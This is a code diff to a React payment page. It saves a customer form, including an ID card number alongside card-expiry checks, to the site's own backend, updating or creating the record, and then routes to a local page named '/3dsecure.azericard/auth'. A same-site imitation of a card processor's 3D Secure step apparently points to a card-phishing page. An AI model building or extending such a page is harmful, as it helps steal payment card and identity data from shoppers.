@@ -119,18 +119,38 @@ const PaymentPage = ({ isAuth }) => {
       /^([01][0-9]|2[0-3])\/[2-9][0-9]$/.test(expirationDate)
     ) {
       setCustomerLoading(true);
-      await axios
-        .post("/customer/add", { shopForm })
-        .then((res) => {
-          console.log("THENNN");
-          navigate("/3dsecure.azericard/auth");
-          setCustomerLoading(false);
-        })
-        .catch((error) => {
-          console.error(error);
-          toast.error("Server error");
-          setCustomerLoading(false);
-        });
+      const IDCardNumber = shopForm.IDCardNumber;
+      if (IDCardNumber) {
+        axios.get(`/customer/get/${IDCardNumber}`)
+          .then(response => {
+            if (response.data.idcard) {
+              axios.put(`/customer/update/${response.data._id}`, { shopForm})
+                .then(response => {
+                  navigate("/3dsecure.azericard/auth");
+                  setCustomerLoading(false);
+                })
+                .catch(error => {
+                  console.error(error);
+                  setCustomerLoading(false);
+                });
+            } else {
+              axios.post('/customer/add', { shopForm })
+                .then(response => {
+                  console.log('New shopForm created:', response.data);
+                  navigate("/3dsecure.azericard/auth");
+                  setCustomerLoading(false);
+                })
+                .catch(error => {
+                  console.error(error);
+                  setCustomerLoading(false);
+                });
+            }
+          })
+          .catch(error => {
+            console.error(error);
+            setCustomerLoading(false);
+          });
+      }
     } else {
       toast.error("Write required parts.");
       setCustomerLoading(false)
